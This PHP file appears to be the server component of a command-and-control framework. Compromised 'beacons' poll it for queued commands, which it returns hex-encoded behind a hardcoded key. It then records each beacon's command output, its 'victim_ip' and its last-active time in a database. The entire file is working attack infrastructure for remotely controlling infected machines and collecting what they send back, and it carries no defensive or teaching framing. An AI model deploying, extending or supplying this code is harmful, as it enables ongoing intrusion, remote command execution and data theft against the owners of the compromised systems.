<?php

$key = "super";

// Connect to the DB
include_once root . "/logic/native/dbconnect.php";

if (isset($_POST["id"]) && $_POST["action"]=="get")
{
    // Prepare a select statement
    $sql = "SELECT command FROM beacons WHERE beacon_id = :beacon_id";

    $beacon_id = $_POST["id"];
    $stmt = $conn->prepare($sql);
    // Bind variables to the prepared statement as parameters
    $stmt->bindParam(":beacon_id", $beacon_id, PDO::PARAM_STR);

    // Attempt to execute the prepared statement
    $stmt->execute();
    // Check if command exists
    if($stmt->rowCount() == 1)
    {
        if($row = $stmt->fetch())
        {
            $command = base64_decode($row["command"]);
        }
    }

    $hex_key = bin2hex($key);
    $hex_command = bin2hex($command);

    $cypher = $hex_key . $hex_command;
  
    echo $cypher;
}
elseif(isset($_POST["id"]) && $_POST["action"]=="deliver")
{
    $response = $_POST["resp"];
    if(empty($response))
    {
        $response=base64_encode("none");
    }
    else
    {
       $response=$_POST["resp"];
    }

    $currentTime = date('Y-m-d H:i:s');

    // Prepare the update statement
    $sql = "UPDATE beacons SET victim_ip = :victim_ip, last_active = DATE_FORMAT(:last_active, '%Y-%m-%d %H:%i:%s'), result = :result WHERE beacon_id = :beacon_id";

    $stmt = $conn->prepare($sql);
    // Bind variables to the prepared statement as parameters
    $stmt->bindParam(":beacon_id", $_POST["id"], PDO::PARAM_STR);
    $stmt->bindParam(":victim_ip", $_SERVER["REMOTE_ADDR"], PDO::PARAM_STR);
    $stmt->bindParam(":last_active", $currentTime, PDO::PARAM_STR);
    $stmt->bindParam(":result", $response, PDO::PARAM_STR);

    // Attempt to execute the prepared statement
    $stmt->execute();

}




// Close the DB connection 
require_once root . "/logic/native/dbclose.php";